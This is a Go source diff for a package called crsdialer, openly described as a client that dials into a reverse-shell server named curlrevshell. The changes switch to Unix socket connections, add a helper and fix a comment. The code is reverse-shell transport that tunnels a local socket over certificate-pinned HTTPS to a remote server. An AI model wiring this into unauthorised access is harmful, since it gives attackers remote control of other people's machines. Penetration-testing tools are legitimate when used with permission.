@@ -6,7 +6,7 @@ package crsdialer
  * Easy dialer to connect to curlrevshell
  * By J. Stuart McMurray
  * Created 20250905
- * Last Modified 20250905
+ * Last Modified 20250924
  */
 
 import (
@@ -17,6 +17,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"os"
 	"strings"
@@ -36,13 +37,13 @@ var ErrNoMatchingCertificate = errors.New(
 )
 
 // Dial connects to curlrevshell at the given server HTTPS URL.  The server's
-// TLS certificate is expected to have the give fingerprint as printed by
+// TLS certificate is expected to have the given fingerprint as printed by
 // curlrevshell, though it allowed to omit SHA256Prefix.
 // The returned os.File, which is really a socketpair, is proxied to and from
 // the HTTPS connection, which will be closed when the os.File is closed or the
 // context is done.
 func Dial(ctx context.Context, serverURL, fingerprint string) (
-	*os.File,
+	*net.UnixConn,
 	error,
 ) {
 	/* Make sure we have all the relevant bits. */
@@ -53,20 +54,27 @@ func Dial(ctx context.Context, serverURL, fingerprint string) (
 		return nil, errors.New("server fingerprint cannot be empty")
 	}
 
-	/* Pair of sockets. */
+	/* Pair of sockets, used as a pipe for shuffling data to and from the
+	TLS connection. */
 	fds, err := syscall.Socketpair(syscall.AF_UNIX, syscall.SOCK_STREAM, 0)
 	if nil != err {
 		return nil, fmt.Errorf("creating socket pair: %w", err)
 	}
-	cSock := os.NewFile(uintptr(fds[0]), "socket(client)")
-	sSock := os.NewFile(uintptr(fds[1]), "socket(server)")
+	cConn, err := unixConn(fds[0], "socket(client)")
+	if nil != err {
+		return nil, fmt.Errorf("creating client socket: %w", err)
+	}
+	sConn, err := unixConn(fds[1], "socket(server)")
+	if nil != err {
+		return nil, fmt.Errorf("creating server socket: %w", err)
+	}
 	var ok bool
 	defer func() {
 		if ok {
 			return
 		}
-		cSock.Close()
-		sSock.Close()
+		cConn.Close()
+		sConn.Close()
 	}()
 
 	/* Roll an HTTP client. */
@@ -90,7 +98,7 @@ func Dial(ctx context.Context, serverURL, fingerprint string) (
 		ctx,
 		http.MethodPost,
 		serverURL,
-		sSock,
+		sConn,
 	)
 	if nil != err {
 		return nil, fmt.Errorf("initializing HTTPS request: %w", err)
@@ -107,13 +115,12 @@ func Dial(ctx context.Context, serverURL, fingerprint string) (
 	/* Proxy from the body to the socketpair. */
 	go func() {
 		defer res.Body.Close()
-		defer cSock.Close()
-		defer sSock.Close()
-		io.Copy(sSock, res.Body)
+		defer sConn.CloseWrite()
+		io.Copy(sConn, res.Body)
 	}()
-	ok = true
 
-	return cSock, nil
+	ok = true
+	return cConn, nil
 }
 
 // TLSFingerprintVerifier returns a function which can be used for
@@ -159,4 +166,31 @@ func TLSFingerprintVerifier(wantFP string) (
 		}
 		return ErrNoMatchingCertificate
 	}, nil
+}
+
+// unixConn turns fd into a net.UnixConn.
+// The original file descriptor will be closed; do not close it.
+func unixConn(fd int, name string) (*net.UnixConn, error) {
+	/* Turn into an os.File, and autoclose. */
+	f := os.NewFile(uintptr(fd), name)
+	defer f.Close()
+
+	/* Turn into a network connection. */
+	c, err := net.FileConn(f)
+	if nil != err {
+		return nil, fmt.Errorf(
+			"copying fd %d as a network connection: %w",
+			fd,
+			err,
+		)
+	}
+
+	/* Should be a unix socket. */
+	uc, ok := c.(*net.UnixConn)
+	if !ok {
+		return nil, fmt.Errorf(
+			"file descriptor was a %T, not a %T", c, uc)
+	}
+
+	return uc, nil
 }
